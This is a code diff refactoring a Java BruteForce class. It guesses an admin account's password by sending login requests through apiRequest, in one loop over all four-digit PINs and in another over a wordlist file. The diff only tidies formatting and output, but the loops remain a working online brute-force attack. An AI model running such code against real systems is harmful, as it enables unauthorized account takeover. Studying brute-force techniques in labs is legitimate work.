@@ -32,28 +32,12 @@ public class BruteForce {
     private void IterationBruteProgram(){
         long start = System.nanoTime();
         for (int password = 0; password < iterations; password++) {
-            long start2 = System.nanoTime();
-
-            String formatPassword;
-
-            if(password <= 9){
-                formatPassword = "000" + password;
-            } else if(password <= 99){
-                formatPassword = "00" + password;
-            } else if(password <= 999){
-                formatPassword = "0" + password;
-            } else {
-                formatPassword = String.valueOf(password);
-            }
+            String formatPassword = String.format("%04d", password);
             System.out.println("Attempt: " + formatPassword);
-
             if(apiRequest(userAdmin, formatPassword)){
-                System.out.println("Password: " + formatPassword);
+                System.out.println("Correct password: " + formatPassword);
                 break;
             }
-            long end2 = System.nanoTime();
-            long total = end2 - start2;
-            System.out.println("Total time: " + total / 1_000_000_000 + " seconds per attempt");
         }
         long end = System.nanoTime();
         long total = end - start;
@@ -61,14 +45,13 @@ public class BruteForce {
     }
 
     private void logicBruteForce(){
-        List<String> passwords = fileReader(filepath);
         long start = System.nanoTime();
-        for (int i = 0; i < passwords.size(); i++) {
-            String formatPassword = String.valueOf(passwords.get(i));
-            System.out.println("Attempt: " + passwords.get(i));
+        for (String password : fileReader(filepath)) {
+            String formatPassword = String.valueOf(password);
+            System.out.println("Attempt: " + password);
 
-            if(apiRequest(userAdmin, formatPassword)){
-                System.out.println("Password: " + passwords.get(i));
+            if (apiRequest(userAdmin, formatPassword)) {
+                System.out.println("Correct password: " + password);
                 break;
             }
         }
